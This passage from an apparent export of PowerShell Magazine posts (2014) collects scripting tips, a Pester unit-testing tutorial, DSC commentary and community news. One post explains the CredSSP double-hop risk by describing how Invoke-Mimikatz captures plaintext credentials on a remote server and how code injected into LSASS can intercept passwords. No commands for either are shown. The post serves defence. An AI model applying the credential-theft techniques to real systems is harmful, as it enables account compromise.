content can be read in a single operation and then I measured again its execution time.\nGet-Content c:\\test.log -Encoding Byte -ReadCount 0  At first glance the result looked very similar to the .NET method, but to my big surprise, it was even faster to complete–only 0.2384541 seconds!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/03/17/pstip-reading-file-content-as-a-byte-array/","tags":["Tips and Tricks"],"title":"#PSTip Reading file content as a byte array"},{"categories":["Community"],"contents":"The Microsoft Technology User Group (MTUG) in Norway was started in March 2010 where we had Bruce Payette speaking at the first user group event at the Microsoft office in Oslo.\nThe overall goal for the user group is to share knowledge and build connections between IT Professionals in Norway. MTUG, registered as a non-profit organization, serves as an umbrella organization for sub divisions. A sub division might be a local user group based on geographical area or virtual user groups based on a topic.\nToday there are three groups based on topics:\nSystem Center Group Organized by Eirik Hamer , Fredrik Kristian Knalstad and Marius Sandbu , this group focus on Microsoft System Center technology and all other integrations to System Center. The goal for the group is to be a meeting point for all members that will share their interests in Microsoft System Center. The meetings includes speaker sessions, hands on labs and workshops.\nMicrosoft UC User Group Norway Organized by Ståle Hansen, Lasse Nordvik Wedø, Maxim Zinchenko and Rune Dyrhaug Stoknes the UC User Group focuses on Microsoft Exchange and Lync. They have virtual meetings hosted on Lync every 1,5 month.\nMTUG Script Club Organized by Jan Egil Ring and Rune Normann Hamre the Script Club is a place where IT Professionals can meet to discuss and assist each other with scripting challenges. The group`s main focus is Windows PowerShell, but the group is also open to discuss other scripting languages. Meetings typically starts with a short introduction to a given topic before the attendants start working on their own laptops. Until now, the meetings have taken place in Oslo, but we are also considering hosting the meetings on Lync.\nThere are also several groups based on location, where Agder and Oslo has been the most active.\nMany great speakers from the PowerShell Community have spoken at our user group in the recent years:\n Aleksandar Nikolic (Server Manager Administration with Windows PowerShell) Don Jones (Introduction to PowerShell Workflow) Ed Wilson (Using PowerShell 3.0 to manage the remote Windows 8 workstation) Thomas Lee (Formatting with PowerShell)  I have also contributed with several workshops and sessions myself, such as “Introduction to PowerShell 3.0”, “Administering Active Directory using PowerShell” and “Windows Server 2012 Hyper-V”.\nScripting Guy Ed Wilson and Jan Egil Ring at a user group meeting in November 2012.\nWindows PowerShell MVP Aleksandar Nikolic speaking at a user group meeting in January 2014.\nThe Script Club will host a workshop May 28th in Oslo where the topic is Windows PowerShell Desired State Configuration . More information and registration is available here.\nYou can find more information about the user group as well as information about upcoming events at www.mtug.no (Norwegian).\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/03/17/the-story-of-the-microsoft-technology-user-group-in-norway/","tags":["Community"],"title":"The story of the Microsoft Technology User Group in Norway"},{"categories":["Hyper-V","Tips and Tricks"],"contents":"I have written scripts to automate VM deployments across a farm of Hyper-V servers and I prefer using static MAC addresses for all my workload virtual machines. So, it is important for me to find the available MAC address so that I can start incrementing from there.\nThe Msvm_VirtualSystemManagementServiceSettingData WMI class in the root\\Virtualization\\v2 namespace gives the maximum and minimum MAC addresses within the pool.\nHowever, the currently available MAC address is not given by this class. For this, we need to look into the Registry on the Hyper-V host at HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Virtualization\\Worker. The CurrentMacAddress value provides the MAC address that can be assigned to a VM.\n$Path = 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Virtualization\\Worker' $CurrentAddress = Get-ItemProperty -Path $Path -Name CurrentMacAddress [System.BitConverter]::ToString($CurrentAddress.CurrentMacAddress) ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/03/12/pstip-get-currently-available-mac-address-from-hyper-v-mac-address-pool/","tags":["Hyper-V","Tips and Tricks"],"title":"#PSTip Get currently available MAC address from Hyper-V MAC address pool"},{"categories":["DevOps","Pester"],"contents":"Some time ago I stumbled upon the Pester framework that promised I would be able to test my scripts. This seemed to be super-useful for my day-to-day scripting, but unfortunately the learning curve was a bit steeper than I thought it would be. It took me reading a book on Test-Driven-Development (TDD) to understand what the ideas behind Pester are, and that they are actually pretty simple. Armed with this knowledge I was finally able to put Pester in use, and found it useful through the whole life cycle of my scripts. To help you with the first steps, I wrote a short series of articles that describe the basics of Pester.\nWhat is Pester? Pester is a unit testing framework for PowerShell. It provides a few simple-to-use keywords that let you create tests for your scripts. Pester implements a test drive to isolate your test files, and it can replace almost any command in PowerShell with your own implementation. This makes it great for both black-box and white-box testing. Pester is best used with TDD approach to development.\nFor those of you who are not familiar with TDD, let me sum it up briefly: TDD is the opposite of the traditional approach to development. Traditionally you write your functional code first and then you write tests for it. You are progressing from implementation (how the code is written) to specification (how it should work). TDD is turning this around, so you progress from specification to implementation. First you define how the code should work and then you write the code. This is a pretty powerful concept.\nIn TDD you write the specification in the form of tests. Before you add any new feature you write a set of tests for it. You run your test suite and make sure all the new tests fail. This shows that there is a feature missing. You then develop the feature, testing it frequently. Once all your tests (including the new ones) pass you know the new feature is finished. You also know you did not break anything else while adding it.\nDo this for every feature, patch or any other change and you are always one test suite run from seeing if everything works as requested. That is the biggest benefit of TDD.\nThere are three more you might like:\n TDD forces you think before you start scripting. If you are unable to write the tests, chances are you don’t fully understand the problem you are trying to solve. Switching between projects and patching bugs becomes easier. With tests in place you don’t have to remember how exactly your components interact. You can focus only on the change you are making and validate the rest by running your tests. Bugs do not reappear. Once write test for a bug and squash it will never get to your production code again.  Pester brings these benefits to PowerShell and that is why I love using it.\nFirst steps Downloading and installing Pester Pester is a PowerShell module authored by Scott Muc and improved by the community. It’s available for free on GitHub and installation is pretty easy. You just download it, extract it to your Modules folder, and then import it to your PowerShell session.\nLet’s start by downloading it from the GitHub and extracting the archive into your Modules directory:\nIf you used Internet Explorer to download the archive, you need to unblock the archive before extraction, otherwise PowerShell will complain when you import the module. If you are using PowerShell 3.0 or newer you can use the Unblock-File cmdlet to do that:\nUnblock-File -Path \u0026quot;$env:UserProfile\\Downloads\\Pester-master.zip\u0026quot; If you are using an older version of PowerShell you will have to unblock the file manually. Go to your Downloads folder and right-click Pester-master.zip. On the general tab click Unblock and then click OK to close the dialog.\nOpen your Modules directory and create a new folder called Pester. You can use this script to open the correct folder effortlessly:\nfunction Get-UserModulePath { $Path = $env:PSModulePath -split \u0026quot;;\u0026quot; -match $env:USERNAME if (-not (Test-Path -Path $Path)) { New-Item -Path $Path -ItemType Container | Out-Null } $Path } Invoke-Item (Get-UserModulePath)  Extract the archive to the Pester folder. When you are done you should have all these files in your Pester directory:\nStart a new PowerShell session and import the Pester module using the commands below:\nGet-Module -ListAvailable -Name Pester Import-Module Pester Get-Module -Name Pester | Select -ExpandProperty ExportedCommands Next you will need a folder to play with. On my computer I created ‘C:\\Pester’ for this purpose and you should do the same. If you choose another working directory, make sure you change the paths in the examples accordingly.\nCreating and failing our first test If you got this far I am sure you can’t wait to start testing. For the first example we’ll start with something extremely simple and create a function called Get-HelloWorld. The function will output a ‘Hello world!’ string when invoked and nothing more.\nBut before we start writing any code we should have a test in place. Creating a new test in Pester is easy. It contains a utility function New-Fixture to create the basic “scaffolding” for a test. Optionally it can create a separate folder to keep our working folder well-organized.\ncd C:\\Pester New-Fixture -Path HelloWorldExample -Name Get-HelloWorld cd .\\HelloWorldExample Dir The “scaffolding” created by the New-Fixture function consists of two files, and auto-generated code that links them. The first file Get-HelloWorld.ps1 is the file where the production code is placed. The second file, Get-HelloWorld.Tests.ps1, is where the tests are placed. First take a look at the content of the Get-HelloWorld.ps1 file.\nfunction Get-HelloWorld { } Nothing surprising except an empty function definition.\nThe content of the Get-HelloWorld.Tests.ps1 file is way more interesting, a default test is waiting there:\n$here = Split-Path -Parent $MyInvocation.MyCommand.Path $sut = (Split-Path -Leaf $MyInvocation.MyCommand.Path).Replace(\u0026quot;.Tests.\u0026quot;, \u0026quot;.\u0026quot;) . \u0026quot;$here\\$sut\u0026quot; Describe “Get-HelloWorld\u0026quot; { It \u0026quot;does something useful\u0026quot; { $true | Should Be $false } } Before explaining how everything works, let’s do some testing first. First you need to change the test to reflect what the Get-HelloWorld function should do. Take the whole content of the tests file and replace it with this:\n$here = Split-Path -Parent $MyInvocation.MyCommand.Path $sut = (Split-Path -Leaf $MyInvocation.MyCommand.Path).Replace(\u0026quot;.Tests.\u0026quot;, \u0026quot;.\u0026quot;) . \u0026quot;$here\\$sut\u0026quot; Describe \u0026quot;Get-HelloWorld\u0026quot; { It \u0026quot;outputs 'Hello world!'\u0026quot; { Get-HelloWorld | Should Be 'Hello world!' } } Now it is time to run the test and see if it passes. To do so, you will use another Pester function called Invoke-Pester. By default,Invoke-Pester runs all the tests in all the files in the current directory and its sub- directories, and that is exactly what we need:\ncd C:\\Pester\\HelloWorldExample Invoke-Pester The output is red, and red means that the test failed. Don’t worry, remember what I said about TDD, you should always start with a failing test. Before we move on to implementing the function we should confirm the test failed for the right reason. In this case we are testing for specific output but the Get-HelloWorld returns nothing. Personally I would expect a message saying that there was no output but output was expected. And fortunately that is what the error message says:“Expected: {Hello world!}, But was {}”. The test fails correctly and we can finally implement the funciton. Open the Get-HelloWorld.ps1 file and replace the empty definition with this:\nfunction Get-HelloWorld { 'Hello world!' } Make sure you saved the file and run the test again:\ncd C:\\Pester\\HelloWorldExample Invoke-Pester The tests passed this time and that means the function is working! Congratulations, you just created, failed and passed your first Pester test!\nSo what happened? Let’s start over and explain what actually happened step-by-step.\nFirst you took the default test and replaced it with another one. Two things were different in these tests. The description of the It block and the code in the It block.\nIn Pester the It block represents one test. The description of the It block sums up what is tested, and the code inside the script block determines whether the test passes or fails. If you’d keep the script block empty the test would always pass. Such test is useless so you need a way to make the test pass or fail depending on a given condition. To do that Pester implements a set of keywords called assertions.\nThe assertion used in the default and the new test is Should Be. This assertion takes input from the pipeline and compares it with the expected value. You provide that value after the Should Be keywords. In the default test the $true is compared to $false and such test always fails.\nIn our test the output of the Get-HelloWorld function is compared to the expected value ‘Hello world!’. So the result of the tests depends on the output of the Get-HelloWorld function. When we invoked the test for the first time Get-HelloWorld produced no output and hence the assertion failed with: “Expected: {Hello world!}, But was {}” message. We then changed the function implementation to produce the correct output and the test passed.\nRest of the tests file In the tests file there are few more things worth noticing. As you can see the It block is placed inside a Describe block. The Describe block represents a group of tests and helps you keep your test file well-organized. It may seem useless now but it will prove more useful as your tests suite will grow. You can change the description of the Describe to whatever you like, but do not remove the Describe block entirely. Every tests file has to have at least one.\nThe Describe keyword, has more to it than grouping your tests. You use it to separate scopes for TestDrive, Mock and you can even use its description to run a set of tests. All these capabilities will be covered later. Now it is enough to remember that every test file has to have at least one Describe block and that the It blocks are placed inside the Describe block.\nThe last thing in the tests file we did not cover are the top three lines of it. These lines link your tests file to your production code file. That is why the Get-HelloWorld function can be used in your tests file even though it is defined elsewhere.\nThe first line sets the $here variable to the path where the tests file is placed. The second line takes the name of the tests file, and by removing the “.Tests.” from the name it gets the name of the code file. The third line joins these two pieces of information together to form a full path to the code file and dot-sources it. Dot-sourcing the code file acts as if you copied the whole content of it and pasted it to the test file. As a result the Get-HelloWorld function can be used inside the tests file.\nSummary This covers the basics of testing with Pester. In the next article we will take a detailed look on more Pester keywords and all the assertions available. Using TestDrive and Mock will follow. If you found this article interesting, you missed something, or you disagree, please share your opinion in the comment section.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/03/12/get-started-with-pester-powershell-unit-testing-framework/","tags":["Pester","DevOps"],"title":"Get started with Pester (PowerShell unit testing framework)"},{"categories":["Active Directory","Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nWhen you get a list of domain controllers using the AD module, one of the propertieseach DC has is the IsReadOnly property. When IsReadOnly is set to $true, the domain controller is a read-only domain controller.\nImport-Module ActiveDirectory Get-ADDomainController -Filter * | Select-Object Name,IsReadOnly  One way to get RODCs is to filter the above result using the Where-Object cmdlet:\nGet-ADDomainController -Filter * | Where-Object {$_.IsReadOnly -eq $true}  But there’s a better and efficient way than that. Using the Filter parameter you filter the objects on the server and get back just the ones that meet the filter criteria whereas piping to Where-Object will get all objects and only then filtering will occur.\nGet-ADDomainController -Filter {IsReadOnly -eq $true}  Without the AD module you can search for read-only domain controllers by querying their primaryGroupID attribute (primary group). RODCs will have a value of 521 which is the “Read-only Domain Controllers” built-in AD group (writable DCs have the primaryGroupID set to 516, which is the “Domain Controllers” group).\n([adsisearcher]'(primaryGroupID=521)').FindAll() ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/03/11/pstip-identifying-read-only-domain-controllers/","tags":["Active Directory","Tips and Tricks"],"title":"#PSTip Identifying read-only domain controllers"},{"categories":["Hyper-V","Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or above.\nThe bandwidth utilized by a VM (QoS = Quality of Service ) can be controlled via special parameters of the virtual network card for a given VM. This settings control the amount of bandwidth (minimum/maximum) a VM can use on the virtual switch and is available on a per network adapter basis in each virtual machine.\nBandwidth minimum guarantees the amount of bandwidth reserved and Bandwidth maximum caps the amount of bandwidth a VM can consume (in bits per second). To disable this feature, set it to 0 (zero).\nThis example sets the maximum bandwidth for VM1 to 200 Mbps\nSet-VMNetworkAdapter -VMName VM1 -MaximumBandwidth 200000000   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/03/10/pstip-setting-vm-bandwidth-management-qos-in-hyper-v-using-powershell/","tags":["Hyper-V","PowerShell"],"title":"#PSTip Setting VM Bandwidth Management QoS in Hyper-V using PowerShell"},{"categories":["WMI","Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nToday, a colleague in the network team asked if we could disable the default DNS registration flag (shown below) because our computers are not allowed to update DNS servers directly.\nAs only Windows 7 computers are targeted, WMI is the correct way to go. We first need to find the WMI properties related to the DNS configuration of the network card.\n(Get-WmiObject Win32_NetworkAdapter -Filter \u0026quot;NetEnabled=True\u0026quot;).GetRelated('Win32_NetworkAdapterConfiguration') | Format-List -Property * The second step consists of using the Get-Member cmdlet to discover the method designed to configure the DNS registration flag.\n(Get-WmiObject Win32_NetworkAdapter -Filter \u0026quot;NetEnabled=True\u0026quot;).GetRelated('Win32_NetworkAdapterConfiguration') | Get-Member -MemberType Method “Invoking” the method without any parenthesis will then show the parameters to be passed to the method:\n(Get-WmiObject Win32_NetworkAdapter -Filter \u0026quot;NetEnabled=True\u0026quot;). GetRelated('Win32_NetworkAdapterConfiguration'). SetDynamicDNSRegistration To test the method and its effect, the following can be done:\n(Get-WmiObject Win32_NetworkAdapter -Filter \u0026quot;NetEnabled=True\u0026quot;).GetRelated('Win32_NetworkAdapterConfiguration').SetDynamicDNSRegistration($false,$false) Desktops usually have only one network card and the above code would work fine on PowerShell 2.0 in this case. But the above code will also produce an error if there’s more than one network card. The above code isn’t actually suitable for laptops. To get the code work on laptops with PowerShell 2.0, we need to pipe it to the ForEach-Object cmdlet:\n(Get-WmiObject -Class Win32_NetworkAdapter -Filter \u0026quot;NetEnabled=True\u0026quot;).GetRelated('Win32_NetworkAdapterConfiguration') | ForEach-Object { $_.SetDynamicDNSRegistration($false,$false) } On PowerShell 3.0 the following would disable the DNS registration flag on all network cards because of the implicit foreach feature\n(Get-WmiObject Win32_NetworkAdapter -Filter \u0026quot;NetEnabled=True\u0026quot;).GetRelated('Win32_NetworkAdapterConfiguration').SetDynamicDNSRegistration($false,$false) And, if we had Windows 8/2012 or above, the correct way to go would have been to use the built-in cmdlets like this:\nGet-NetIPConfiguration | Get-NetConnectionProfile | Where IPv4Connectivity -ne \u0026quot;NoTraffic\u0026quot; | Set-DnsClient -RegisterThisConnectionsAddress:$false -Verbose The above where filter can also be avoided like this:\nGet-NetConnectionProfile -IPv4Connectivity Internet,Disconnected,LocalNetwork,Subnet -ErrorAction SilentlyContinue | Set-DnsClient -RegisterThisConnectionsAddress:$false -Verbose Last but not least, DNS records might not be automatically removed from DNS servers. You may need to follow additional steps from this knowledge based article whether your network card was configured to use a static or a dynamic IP address: http://support.microsoft.com/kb/2933537/en-us.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/03/07/pstip-how-to-disable-dns-registration-with-powershell/","tags":["Tips and Tricks","WMI"],"title":"#PSTip How to disable DNS registration with PowerShell"},{"categories":["Tips and Tricks"],"contents":"GitHub, a service for hosting development projects that can be written in many programing and scripting languages has its own extensions to the popular Markdown style. This allows us to add syntax highlighting in our Markdown files inside of our repositories (like the README.md file). Also, when opening Issues, Pull Request and even on the Wiki we can use it in code blocks to syntax highlight code following one of the supported language types.\nThe way we specify what type of syntax highlighting should be used for processing the code block is by adding at the front of the triple backtick marker used by Github the name of the language. In the case of PowerShell it would be:\n\u0026lt;# .Synopsis Short description .DESCRIPTION Long description .EXAMPLE Example of how to use this cmdlet .EXAMPLE Another example of how to use this cmdlet #\u0026gt; function Verb-Noun { [CmdletBinding()] [OutputType([int])] Param ( # Param1 help description [Parameter(Mandatory=$true, ValueFromPipelineByPropertyName=$true, Position=0)] $Param1, # Param2 help description [int] $Param2 ) Begin { } Process { } End { } } GitHub would render this in the following manner:\nIf you plan to use Markdown files in your project to document it or to generate documentation you will later export to HTML or PDF, you can also use a program called MarkdownPad 2 Pro . The Pro version allows use of the GitHub Markdown Engine in its Options.\nThis works great when one wants to edit the Markdown files locally and see a preview of how they would look rendered.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/03/06/pstip-github-powershell-syntax-highlighting-in-markdown/","tags":["Tips and Tricks"],"title":"#PSTip GitHub PowerShell syntax highlighting in Markdown"},{"categories":["How To","Security"],"contents":"One common issue that an administrator faces when using PowerShell remoting is the “double hop” problem. An administrator uses PowerShell remoting to connect to Server A and then attempts to connect from Server A to Server B. Unfortunately, the second connection fails.\nThe reason is that, by default, PowerShell remoting authenticates using a “Network Logon”. Network Logons work by proving to the remote server that you have possession of the users credential without sending the credential to that server (see Kerberos and NTLM authentication). Because the remote server doesn’t have possession of your credential, when you try to make the second hop (from Server A to Server B) it fails because Server A doesn’t have a credential to authenticate to Server B with.\nTo get around this issue, PowerShell provides the CredSSP (Credential Security Support Provider) option. When using CredSSP, PowerShell will perform a “Network Clear-text Logon” instead of a “Network Logon”. Network Clear-text Logon works by sending the user’s clear-text password to the remote server. When using CredSSP, Server A will be sent the user’s clear-text password, and will therefore be able to authenticate to Server B. Double hop works!\nFigure 1: The computers colored red have the user credentials cached on them.\nWhile this is certainly convenient, it comes at a price: If the server you authenticate to using CredSSP is compromised, so are your credentials.\nAn attacker with administrative privilege on a server can intercept any data that is sent to/from the server, as well as view any data in memory and on disk, by design. Because the CredSSP authentication option sends your clear-text credentials to the remote server, an attacker with administrative privilege on the remote server can easily intercept your username and password.\nTo prove this to you, I’ll do a quick demonstration.\nFirst, I’ll create a PSSession to connect to a remote session using CredSSP; then I will run Mimikatz, a hacker tool used to capture the credentials of users logged in to the server. Because this is PowerShell Magazine, I will use a version of Mimikatz, called Invoke-Mimikatz, which has been modified to run as a PowerShell script.\nFigure 2: Connecting to a server using CredSSP and running Invoke-Mimikatz\nFigure 3: Mimikatz output showing that the credentials for DEMO\\administrator are stored on a remote server when using CredSSP\nNext, I’ll create a PSSession to connect to a remote computer without using CredSSP. This time, Mimikatz isn’t able to capture any credentials.\nFigure 4: Connecting to a server without using CredSSP and running Invoke-Mimikatz\nThis shows that when you use CredSSP, your credentials can be captured on the remote computer. If you don’t use CredSSP, you can authenticate to any server you’d like without disclosing your credentials (which makes it harder for an attacker to obtain privileged credentials).\nIs it ever safe to use CredSSP? Certainly. The important thing to realize is that you are putting your credentials on the server you authenticate to. It is a bad idea to use CredSSP to authenticate to a user’s workstation using a domain administrator account; you are essentially giving away the keys to the kingdom. It would be perfectly acceptable to use a domain administrator to authenticate to a domain controller using CredSSP because the domain controller is a high trust server.\nDesigning safe operating procedures is outside the scope of this article, but the general rule is: Don’t put high trust credentials on low trust computers. Additionally, you should always try to design your systems to work with single-hop rather than double-hop so that CredSSP isn’t needed.\nUpdate: This testing was done using Windows Server 2012. Microsoft has made changes to Windows Server 2012R2 and Windows 8.1 to eliminate clear-text credentials from being stored in memory. This means that an attacker who runs Mimikatz will no longer see your clear-text credentials. An attacker will still see your NT password hash and your Kerberos TGT, both of which are password equivalent and can be used to authenticate as you over the network.\nAdditionally, even though your clear-text credential is not saved in memory, it is still sent to the remote server. An attacker can inject malicious code in the Local Security Authority Subsystem Service (LSASS.exe) and intercept your password in transit. So while you may not see your password with Mimikatz anymore, your password can still be recovered by an attacker.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/03/06/accidental-sabotage-beware-of-credssp/","tags":["How To","Security"],"title":"Accidental Sabotage: Beware of CredSSP"},{"categories":["AWS","Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nI have been working with Amazon Web Services (AWS) and for me the default management tool is their PowerShell module. I have multiple computers that I use to work with AWS and I rebuild them quite often. So, I needed a method to speed up this process.\nWhat’s better than a reusable PowerShell function?\nfunction Install-AWSPowerShellTool { [CmdletBinding()] param ( [Parameter()] [String] $Url = \u0026quot;http://sdk-for-net.amazonwebservices.com/latest/AWSToolsAndSDKForNet.msi\u0026quot;, [Parameter()] [Switch] $UpdateProfile ) if (-not ($PSVersionTable.PSVersion -ge [Version]\u0026quot;2.0.0.0\u0026quot;)) { Throw \u0026quot;PowerShell version must be 2.0 or above\u0026quot; } if (!(New-Object Security.Principal.WindowsPrincipal ([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) { Throw \u0026quot;This function must be run as an administrator\u0026quot; } Write-Verbose \u0026quot;Downloading AWS PowerShell Tools from ${url}\u0026quot; Start-BitsTransfer -Source $url -Destination $env:TEMP -Description \u0026quot;AWS PowerShell Tools\u0026quot; -DisplayName \u0026quot;AWS PowerShell Tools\u0026quot; Write-Verbose \u0026quot;Starting AWS PowerShell Tools install using ${env:Temp}\\$(Split-Path -Path $Url -Leaf)\u0026quot; $Process = Start-Process -FilePath \u0026quot;msiexec.exe\u0026quot; -ArgumentList \u0026quot;/i ${env:Temp}\\$(Split-Path -Path $Url -Leaf) /qf /passive\u0026quot; -Wait -PassThru if ($Process.ExitCode -ne 0) { Throw \u0026quot;Install failed with exit code $($Process.ExitCode)\u0026quot; } else { if ($UpdateProfile) { if (-not (test-Path (Split-Path $PROFILE))) { Write-Verbose \u0026quot;Creating WindowsPowerShell folder for copying the profile\u0026quot; New-Item -Path (Split-Path $PROFILE) -ItemType Directory -Force | Out-Null } Write-Verbose \u0026quot;Updating PowerShell Profile at ${PROFILE}\u0026quot; Add-Content -Path $PROFILE -Value 'Import-Module -Name \u0026quot;C:\\Program Files (x86)\\AWS Tools\\PowerShell\\AWSPowerShell\\AWSPowerShell.psd1\u0026quot;' -Force } } }  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/03/05/pstip-installing-and-setting-up-aws-powershell-tools/","tags":["AWS","Tips and Tricks"],"title":"#PSTip Installing and setting up AWS PowerShell Tools"},{"categories":["PowerShell DSC"],"contents":"My answer is no! At least, not everything I need right now. A few days ago, I tweeted some of my thoughts. I want to use this article to expand on that.\nWhen looking at #PowerShell DSC, first think through and decide if DSC is THE thing you need. Sometimes, a script or workflow is better.\n\u0026mdash; Ravikanth Chaganti (@ravikanth) February 16, 2014  Before I go ahead saying anything else, let me tell you that I am a BIG fan of DSC and its declarative style of configuration management. DSC is a new entrant in an already crowded space. But, DSC is significant because it is built into the operating system and it is standards based. PowerShell is one method to use DSC. With the initial release of DSC, product team at Microsoft did a great job. This is certainly a great step forward in realizing the Cloud OS vision. Given the technologies it depends on, it is fair to say that, at some point in time, we would be able to manage non-Windows systems too with DSC.\nWith PowerShell and DSC, anything that can be scripted can be a DSC resource module. But, that is not always the right approach. With the declarative style, everything looks really clean and simple. But, remember, there is a resource module that is doing that heavy lifting behind the scenes. I have been reading, writing, and speaking about DSC. I have also written a few custom DSC resources. Every time, I start writing a DSC resource, I ask myself one question – do I really need this as a DSC resource? The answer to this is important. Let’s explore.\nOrchestration vs Configuration Management If you look deep into the way DSC works, you will see that you either push or pull the configuration. The Local Configuration Manager (LCM) knows how to tackle the incoming configuration items provided it has all the dependent resource modules. And, the actual configuration change takes place locally. The system that you use either to push or pull configuration is just an intermediate node and does not involve in any sort of coordination. The configuration changes that happen are within the box. Configuration management (CM) is about standardizing and enforcing configurations. This is what DSC (and others in this space) is good at. Using configuration documents you can define configuration of a node in a standardized manner and using the configuration mode settings, you can enforce that configuration. A configuration item can be anything that can be changed locally. For example, in DSC, you can use Package resource to deploy an application or use Registry resource to add/modify/delete Registry entries.\nBut, what happens if there is a requirement such that you want to wait for service A on server A to be enabled before you start service B and server B. This calls for orchestration.\n From Wikipedia:\nOrchestration describes the automated arrangement, coordination, and management of complex computer systems, middleware, and services.\n This orchestration may include things such as waiting for services on the remote systems, waiting for remote systems to reboot, waiting for install process to complete on remote systems, and so on. There is no inter-node dependency that can be described in a DSC configuration document. You can, of course, add whatever is required for the orchestration as another DSC resource module. This approach can be quite complex given the semantics of writing a DSC resource module.\nI strongly believe that orchestration is a layer above configuration management. There are many existing CM frameworks that provide orchestration capabilities. But, there is nothing close to what a real orchestrator provides. DSC is no exception. Today, we might be able to use products such as the System Center suite to build the orchestration capabilities while leveraging DSC for configuration management and I believe that is the right approach for a larger deployments. But, for small and medium businesses, having the orchestration capabilities built into a feature like DSC can be quite valuable.\nRight tools for the job When PowerShell 3.0 was released, the Workflowswas touted to be the flagship feature. It was, no doubt about that. Workflows combine the power what background jobs and remoting can do along with lot of other features such as persistence and enabling dependencies through parallel and sequential activities. The biggest problem with Workflows was (as still is), the lack of supported activities. For example, if I want to use some custom cmdlets in a Workflow activity, I have to resort to an InlineScript which almost kills all Workflow features inside it. But, given all the limitations, Workflows can enable orchestration of your data center infrastructure. When I contrast DSC with Workflows for orchestration, I prefer Workflows.\nDSC may or may not get the real orchestration capabilities in future. So, at the moment, consider alternate approaches when automating complex multi-machine configurations that are inter-dependent. These alternate approaches can either be standalone scripts or Workflows.\nIf you are an IT Pro who is just using the custom resources written by someone else, ensure that it satisfies your requirements. For example, when creating VMs on a Hyper-V cluster, the abstracted resource must be the cluster. Without that, when a VM moves from one cluster node to another, DSC will fail to find the VM on the node where the configuration was applied, and it will recreate the VM. This can have unintended consequences.\nIf you are planning to write custom resources, I suggest that you consider the real usecase and the complexities involved in end to end configuration. This might give you some insight into whether you really need a DSC resource module or not.\nAll that said, I am still a BIG fan of DSC. I just wish Microsoft adds more capabilities such as inter-node dependencies and interaction with existing Workflows, etc in the upcoming releases. I have created a connect suggestion for the inter-node dependencies. If you think having that capability eases multi-machine deployments and orchestration, go ahead and vote for it.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/03/05/is-desired-state-configuration-dsc-everything-i-need/","tags":["PowerShell DSC"],"title":"Is Desired State Configuration (DSC) everything I need?"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nI bet this sounds familiar to you. You start working in the PowerShell console or in the ISE, and then at one point you figure out that a command you’re executing fails because your session is not elevated! You start saving your work so you can close the session and reopen it “as an administrator”.\nSituations like this can be very irritating ( to me anyway), and that’s why I wrote Restart-Host function.\nfunction Restart-Host { [CmdletBinding(SupportsShouldProcess,ConfirmImpact='High')] Param( [switch]$AsAdministrator, [switch]$Force ) $proc = Get-Process -Id $PID $cmdArgs = [Environment]::GetCommandLineArgs() | Select-Object -Skip 1 $params = @{ FilePath = $proc.Path } if ($AsAdministrator) { $params.Verb = 'runas' } if ($cmdArgs) { $params.ArgumentList = $cmdArgs } if ($Force -or $PSCmdlet.ShouldProcess($proc.Name,\u0026quot;Restart the console\u0026quot;)) { if ($host.Name -eq 'Windows PowerShell ISE Host' -and $psISE.PowerShellTabs.Files.IsSaved -contains $false) { if ($Force -or $PSCmdlet.ShouldProcess('Unsaved work detected?','Unsaved work detected. Save changes?','Confirm')) { foreach ($IseTab in $psISE.PowerShellTabs) { $IseTab.Files | ForEach-Object { if ($_.IsUntitled -and !$_.IsSaved) { $_.SaveAs($_.FullPath,[System.Text.Encoding]::UTF8) } elseif(!$_.IsSaved) { $_.Save() } } } } else { foreach ($IseTab in $psISE.PowerShellTabs) { $unsavedFiles = $IseTab.Files | Where-Object IsSaved -eq $false $unsavedFiles | ForEach-Object {$IseTab.Files.Remove($_,$true)} } } } Start-Process @params $proc.CloseMainWindow() } }  When invoked from powershell.exe, Restart-Host will close your current session and reopen it as an administrator while restoring the parameters used to load your current session.\nWhen invoked from the ISE you will also get the chance to save any unsaved scripts.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/03/04/pstip-restarting-powershell-as-an-administrator/","tags":["Tips and Tricks"],"title":"#PSTip Restarting PowerShell as an administrator"},{"categories":["News"],"contents":"I am very happy to announce that Jan Egil Ring accepted to join PowerShell Magazine. Jan is a known personality in the Windows PowerShell and virtualization communities. He was one of our contributing authors too. He is working as a Lead Architect on the Infrastructure Team at Crayon, Norway. I had the opportunity to meet Jan at The Experts Conference in Germany. We even had an interview with him published on PowerShell Magazine.\nJan is an active contributor of DSC Resource Kit Community Edition and blogs at blog.powershell.no. Of course, he will now start writing here! 🙂 Jan recently spoke at NIC Conf about the Desired State Configuration feature in Windows. I recommend this talk to anyone who is getting started with DSC.\nOnce again, we are excited to have Jan onboard with us. Welcome Jan! This is certainly a step forward towards realizing the vision I’d mentioned in my last 